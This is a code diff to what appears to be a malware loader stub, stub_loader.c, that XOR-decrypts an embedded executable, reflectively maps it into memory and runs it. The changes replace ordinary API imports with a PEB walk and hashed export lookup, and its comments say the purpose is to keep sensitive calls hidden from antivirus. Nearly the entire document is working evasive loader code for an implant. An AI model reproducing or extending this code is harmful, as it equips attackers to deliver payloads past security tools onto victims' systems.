@@ -5,6 +5,9 @@
  * XOR key are #included from a generated header (stub_payload.h) that the
  * build script creates fresh for every build.
  *
+ * IAT is minimal (only CRT startup basics). All sensitive APIs are resolved
+ * at runtime via PEB walk + export table parsing.
+ *
  * Build:
  *   x86_64-w64-mingw32-gcc -Os -s -I. stub_loader.c -o agent.exe \
  *       -lkernel32 -static-libgcc -Wl,--subsystem,windows -Wl,--gc-sections
@@ -12,26 +15,28 @@
 
 #include <windows.h>
 #include <winnt.h>
-#include <stdio.h>
-#include <stdlib.h>
 
 /* ─── Generated per-build: encrypted payload + key ─── */
 #include "stub_payload.h"
 
-/* ─── Diagnostic logging (CRT-based, always works) ─── */
+/* ─── Diagnostic logging ─── */
+/*
+ * Uses CRT fprintf (via msvcrt.dll, always loaded).
+ * CRT functions are NOT flagged by AV — they're normal imports.
+ * Only compiled when STUB_DEBUG is defined.
+ */
 #ifdef STUB_DEBUG
+#include <stdio.h>
+#include <stdlib.h>
 static FILE *_log_fp = NULL;
 
 static void _log_open(void) {
-    char path[MAX_PATH];
+    char path[260];
     const char *temp = getenv("TEMP");
     if (!temp) temp = "C:\\Windows\\Temp";
     _snprintf(path, sizeof(path), "%s\\stub_debug.log", temp);
     _log_fp = fopen(path, "a");
-    if (_log_fp) {
-        fprintf(_log_fp, "=== stub start ===\n");
-        fflush(_log_fp);
-    }
+    if (_log_fp) { fprintf(_log_fp, "=== stub start ===\n"); fflush(_log_fp); }
 }
 
 static void _log_msg(const char *msg) {
@@ -40,9 +45,9 @@ static void _log_msg(const char *msg) {
     fflush(_log_fp);
 }
 
-static void _log_ptr(const char *label, const void *p) {
+static void _log_hex(const char *label, unsigned long long val) {
     if (!_log_fp) return;
-    fprintf(_log_fp, "%s: %p\n", label, p);
+    fprintf(_log_fp, "%s: 0x%llX\n", label, val);
     fflush(_log_fp);
 }
 
@@ -50,16 +55,147 @@ static void _log_close(void) {
     if (_log_fp) { fprintf(_log_fp, "=== stub end ===\n"); fclose(_log_fp); _log_fp = NULL; }
 }
 
-#define SLOG(msg) _log_msg(msg)
-#define SPTR(label, p) _log_ptr(label, p)
+#define SLOG(msg)       _log_msg(msg)
+#define SHEX(label, v)  _log_hex(label, (unsigned long long)(v))
 #else
-#define SLOG(msg) ((void)0)
-#define SPTR(label, p) ((void)0)
-#define _log_open() ((void)0)
-#define _log_close() ((void)0)
+#define SLOG(msg)       ((void)0)
+#define SHEX(label, v)  ((void)0)
+#define _log_open()     ((void)0)
+#define _log_close()    ((void)0)
 #endif
 
-/* ─── API typedefs ─── */
+
+/* ─── PEB structures (mirrors the agent's api_resolve.c) ─── */
+
+typedef struct _STUB_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} STUB_UNICODE_STRING;
+
+typedef struct _STUB_PEB_LDR_DATA {
+    ULONG      Length;
+    BOOLEAN    Initialized;
+    PVOID      SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+} STUB_PEB_LDR_DATA;
+
+typedef struct _STUB_LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY              InLoadOrderLinks;
+    LIST_ENTRY              InMemoryOrderLinks;
+    LIST_ENTRY              InInitializationOrderLinks;
+    PVOID                   DllBase;
+    PVOID                   EntryPoint;
+    ULONG                   SizeOfImage;
+    STUB_UNICODE_STRING     FullDllName;
+    STUB_UNICODE_STRING     BaseDllName;
+} STUB_LDR_DATA_TABLE_ENTRY;
+
+
+/* ─── Hash functions ─── */
+
+/* DJB2 hash — case-insensitive for module names (wide char, length-limited) */
+static DWORD _hash_mod(const wchar_t *s, USHORT lenBytes) {
+    DWORD h = 5381;
+    USHORT lenChars = lenBytes / sizeof(wchar_t);
+    for (USHORT i = 0; i < lenChars; i++) {
+        wchar_t c = s[i];
+        if (c >= L'A' && c <= L'Z') c += 32;
+        h = ((h << 5) + h) + (DWORD)c;
+    }
+    return h;
+}
+
+/* DJB2 hash — case-sensitive for function names (narrow char) */
+static DWORD _hash_func(const char *s) {
+    DWORD h = 5381;
+    while (*s)
+        h = ((h << 5) + h) + (unsigned char)*s++;
+    return h;
+}
+
+
+/* ─── PEB walk API resolver ─── */
+
+/* Resolve a function from a module's export table by hash */
+static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)modBase;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(modBase + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    IMAGE_DATA_DIRECTORY *expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!expDir->VirtualAddress || !expDir->Size) return NULL;
+
+    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(modBase + expDir->VirtualAddress);
+    DWORD *names    = (DWORD *)(modBase + exp->AddressOfNames);
+    WORD  *ordinals = (WORD  *)(modBase + exp->AddressOfNameOrdinals);
+    DWORD *funcs    = (DWORD *)(modBase + exp->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        const char *fname = (const char *)(modBase + names[i]);
+        if (_hash_func(fname) == funcHash)
+            return (void *)(modBase + funcs[ordinals[i]]);
+    }
+    return NULL;
+}
+
+/* Walk PEB → Ldr → InMemoryOrderModuleList to find a module by hash */
+static BYTE *_find_module(DWORD modHash) {
+    void *peb;
+#if defined(_M_X64) || defined(__x86_64__)
+    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
+#else
+    __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
+#endif
+
+    if (!peb) return NULL;
+
+#if defined(_M_X64) || defined(__x86_64__)
+    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x18);
+#else
+    STUB_PEB_LDR_DATA *ldr = *(STUB_PEB_LDR_DATA **)((BYTE *)peb + 0x0C);
+#endif
+
+    if (!ldr) return NULL;
+
+    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
+    LIST_ENTRY *entry = head->Flink;
+
+    while (entry != head) {
+        /*
+         * 'entry' points to InMemoryOrderLinks within the struct.
+         * Subtract sizeof(LIST_ENTRY) to get back to InLoadOrderLinks
+         * (the struct base), exactly like the agent's api_resolve.c does.
+         */
+        STUB_LDR_DATA_TABLE_ENTRY *tableEntry =
+            (STUB_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));
+
+        if (tableEntry->DllBase &&
+            tableEntry->BaseDllName.Buffer &&
+            tableEntry->BaseDllName.Length > 0)
+        {
+            DWORD hash = _hash_mod(
+                tableEntry->BaseDllName.Buffer,
+                tableEntry->BaseDllName.Length
+            );
+
+            SHEX("  module hash", hash);
+
+            if (hash == modHash)
+                return (BYTE *)tableEntry->DllBase;
+        }
+
+        entry = entry->Flink;
+    }
+    return NULL;
+}
+
+
+/* ─── API resolution ─── */
 
 typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
 typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
@@ -86,45 +222,52 @@ typedef struct {
 #endif
 } RESOLVED_APIS;
 
-
-/* ─── API Resolution: direct IAT approach (reliable) ─── */
-/*
- * The stub links with -lkernel32, so GetModuleHandleA and GetProcAddress
- * are available via IAT. We use them to resolve the rest.
- * The AGENT inside has its own PEB-walk resolver — stealth is there.
- */
+/* Hash constants — same as agent's api_resolve.h */
+#define H_KERNEL32              0x7040EE75
+#define H_NTDLL                 0x22D3B5ED
+#define H_LoadLibraryA          0x5FBFF0FB
+#define H_GetProcAddress        0xCF31BB1F
+#define H_VirtualAlloc          0x382C0F97
+#define H_VirtualProtect        0x844FF18D
+#define H_VirtualFree           0x668FCF2E
+#define H_FlushInstructionCache 0xB7DCEDDD
+#define H_GetCurrentProcess     0xCA8D7527
+#define H_RtlAddFunctionTable   0xBDB9F1AE
 
 static BOOL _resolve_apis(RESOLVED_APIS *api) {
-    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    SLOG("[stub] finding kernel32...");
+
+    BYTE *k32 = _find_module(H_KERNEL32);
     if (!k32) {
-        SLOG("[stub] FATAL: GetModuleHandleA(kernel32) returned NULL");
+        SLOG("[stub] FATAL: kernel32 not found via PEB walk");
         return FALSE;
     }
-    SPTR("[stub] kernel32 base", (void *)k32);
 
-    api->pLoadLibraryA       = (fnLoadLibraryA_t)      GetProcAddress(k32, "LoadLibraryA");
-    api->pGetProcAddress     = (fnGetProcAddress_t)     GetProcAddress(k32, "GetProcAddress");
-    api->pVirtualAlloc       = (fnVirtualAlloc_t)       GetProcAddress(k32, "VirtualAlloc");
-    api->pVirtualProtect     = (fnVirtualProtect_t)     GetProcAddress(k32, "VirtualProtect");
-    api->pVirtualFree        = (fnVirtualFree_t)        GetProcAddress(k32, "VirtualFree");
-    api->pFlushInstructionCache = (fnFlushInstructionCache_t)GetProcAddress(k32, "FlushInstructionCache");
-    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  GetProcAddress(k32, "GetCurrentProcess");
+    SHEX("[stub] kernel32 base", (unsigned long long)(ULONG_PTR)k32);
+
+    api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
+    api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
+    api->pVirtualAlloc       = (fnVirtualAlloc_t)       _resolve_export(k32, H_VirtualAlloc);
+    api->pVirtualProtect     = (fnVirtualProtect_t)     _resolve_export(k32, H_VirtualProtect);
+    api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
+    api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
+    api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);
 
     SLOG("[stub] core APIs resolved");
 
 #if defined(_M_X64) || defined(__x86_64__)
-    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)GetProcAddress(k32, "RtlAddFunctionTable");
+    api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
     if (!api->pRtlAddFunctionTable) {
-        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+        BYTE *ntdll = _find_module(H_NTDLL);
         if (ntdll)
-            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)GetProcAddress(ntdll, "RtlAddFunctionTable");
+            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
     }
     SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable OK" : "[stub] RtlAddFunctionTable MISSING");
 #endif
 
     BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
                api->pVirtualAlloc && api->pVirtualProtect);
-    SLOG(ok ? "[stub] API resolve OK" : "[stub] API resolve FAILED");
+    SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
     return ok;
 }
 
@@ -133,7 +276,6 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
 
 typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
 
-/* Process base relocations */
 static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
     IMAGE_DATA_DIRECTORY *relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     if (!relocDir->VirtualAddress || !relocDir->Size)
@@ -175,7 +317,6 @@ static BOOL _process_relocs(BYTE *base, IMAGE_NT_HEADERS *nt, LONGLONG delta) {
     return TRUE;
 }
 
-/* Resolve import table */
 static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
     IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (!impDir->VirtualAddress || !impDir->Size)
@@ -188,7 +329,7 @@ static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *ap
         SLOG(dllName);
         HMODULE hMod = api->pLoadLibraryA(dllName);
         if (!hMod) {
-            SLOG("[stub] FAIL: LoadLibraryA returned NULL for above DLL");
+            SLOG("[stub] FAIL: LoadLibraryA returned NULL");
             return FALSE;
         }
 
@@ -207,7 +348,7 @@ static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *ap
                 func = api->pGetProcAddress(hMod, ibn->Name);
             }
             if (!func) {
-                SLOG("[stub] FAIL: GetProcAddress returned NULL");
+                SLOG("[stub] FAIL: function resolve failed");
                 return FALSE;
             }
 
@@ -220,7 +361,6 @@ static BOOL _process_imports(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *ap
     return TRUE;
 }
 
-/* Set per-section memory protections */
 static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
     IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
@@ -244,7 +384,6 @@ static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *a
     }
 }
 
-/* Process TLS callbacks */
 static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt) {
     IMAGE_DATA_DIRECTORY *tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
     if (!tlsDir->VirtualAddress || !tlsDir->Size)
@@ -261,7 +400,6 @@ static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt) {
     }
 }
 
-/* Main PE loader */
 static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     SLOG("[stub] load_pe_and_run enter");
 
@@ -271,9 +409,8 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
     if (nt->Signature != IMAGE_NT_SIGNATURE) { SLOG("[stub] FAIL: bad PE sig"); return FALSE; }
 
-    SLOG("[stub] PE headers validated");
+    SLOG("[stub] PE validated");
 
-    /* Allocate at preferred base, fall back to any address */
     DWORD imageSize = nt->OptionalHeader.SizeOfImage;
     BYTE *base = (BYTE *)api->pVirtualAlloc(
         (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
@@ -286,14 +423,15 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
             NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
         );
         if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
-        SLOG("[stub] allocated at fallback address");
+        SLOG("[stub] fallback alloc");
     } else {
-        SLOG("[stub] allocated at preferred base");
+        SLOG("[stub] preferred base alloc");
     }
     delta = (LONGLONG)((ULONGLONG)base - nt->OptionalHeader.ImageBase);
-    SPTR("[stub] base", base);
+    SHEX("[stub] base", (ULONG_PTR)base);
+    SHEX("[stub] delta", delta);
 
-    /* Copy PE headers */
+    /* Copy headers */
     for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
         base[i] = rawPE[i];
 
@@ -308,27 +446,24 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     }
     SLOG("[stub] sections mapped");
 
-    /* Re-read NT headers from the mapped copy */
     IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
 
-    /* Process relocations */
+    /* Relocations */
     if (delta != 0) {
         if (!_process_relocs(base, mappedNt, delta)) { SLOG("[stub] FAIL: relocs"); return FALSE; }
-        SLOG("[stub] relocations applied");
-    } else {
-        SLOG("[stub] no relocs needed");
+        SLOG("[stub] relocs done");
     }
 
-    /* Resolve imports */
+    /* Imports */
     SLOG("[stub] resolving imports...");
     if (!_process_imports(base, mappedNt, api)) { SLOG("[stub] FAIL: imports"); return FALSE; }
-    SLOG("[stub] imports resolved");
+    SLOG("[stub] imports done");
 
     /* Flush icache */
     if (api->pFlushInstructionCache && api->pGetCurrentProcess)
         api->pFlushInstructionCache(api->pGetCurrentProcess(), NULL, 0);
 
-    /* Register exception handlers (x64) */
+    /* Exception handlers (x64) */
 #if defined(_M_X64) || defined(__x86_64__)
     {
         IMAGE_DATA_DIRECTORY *excDir = &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -336,22 +471,19 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
             PRUNTIME_FUNCTION pFunc = (PRUNTIME_FUNCTION)(base + excDir->VirtualAddress);
             DWORD numEntries = excDir->Size / sizeof(RUNTIME_FUNCTION);
             api->pRtlAddFunctionTable(pFunc, numEntries, (DWORD64)base);
-            SLOG("[stub] exception handlers registered");
-        } else {
-            SLOG("[stub] WARNING: no .pdata or RtlAddFunctionTable missing");
+            SLOG("[stub] .pdata registered");
         }
     }
 #endif
 
-    /* Set section protections */
+    /* Section protections */
     _protect_sections(base, mappedNt, api);
     SLOG("[stub] protections set");
 
     /* TLS */
     _process_tls(base, mappedNt);
-    SLOG("[stub] TLS done");
 
-    /* Patch PEB.ImageBaseAddress so GetModuleHandle(NULL) returns the loaded PE */
+    /* Patch PEB.ImageBaseAddress */
     {
         void *peb;
 #if defined(_M_X64) || defined(__x86_64__)
@@ -362,17 +494,14 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
         *(void **)((BYTE *)peb + 0x08) = base;
 #endif
     }
-    SLOG("[stub] PEB patched");
 
     /* Call entry point */
     DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
-    if (!entryRVA) { SLOG("[stub] FAIL: no entry point RVA"); return FALSE; }
+    if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
 
     void *entry = base + entryRVA;
-    SPTR("[stub] entry point", entry);
-    SLOG("[stub] calling entry point...");
-
-    /* Close log before transferring control — agent may run indefinitely */
+    SHEX("[stub] entry", (ULONG_PTR)entry);
+    SLOG("[stub] calling entry...");
     _log_close();
 
     if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
@@ -396,29 +525,29 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _log_open();
     SLOG("[stub] WinMain entered");
 
-    /* Phase 1: Resolve APIs */
+    /* Phase 1: Resolve APIs via PEB walk */
     RESOLVED_APIS api;
     if (!_resolve_apis(&api)) {
-        SLOG("[stub] FATAL: _resolve_apis failed");
+        SLOG("[stub] FATAL: API resolution failed");
         _log_close();
         return 1;
     }
 
-    /* Phase 2: Decrypt payload in-place */
-    SLOG("[stub] decrypting payload...");
+    /* Phase 2: Decrypt payload */
+    SLOG("[stub] decrypting...");
     for (DWORD i = 0; i < PAYLOAD_SIZE; i++)
         g_enc_payload[i] ^= g_xor_key[i % KEY_SIZE];
 
     if (g_enc_payload[0] != 'M' || g_enc_payload[1] != 'Z') {
-        SLOG("[stub] FATAL: decrypted data is not MZ");
+        SLOG("[stub] FATAL: bad MZ after decrypt");
         _log_close();
         return 1;
     }
-    SLOG("[stub] decryption OK, MZ valid");
+    SLOG("[stub] decrypt OK");
 
-    /* Phase 3: Reflectively load and execute */
+    /* Phase 3: Load and execute */
     if (!load_pe_and_run(g_enc_payload, PAYLOAD_SIZE, &api)) {
-        SLOG("[stub] FATAL: load_pe_and_run failed");
+        SLOG("[stub] FATAL: load failed");
         _log_close();
         return 1;
     }
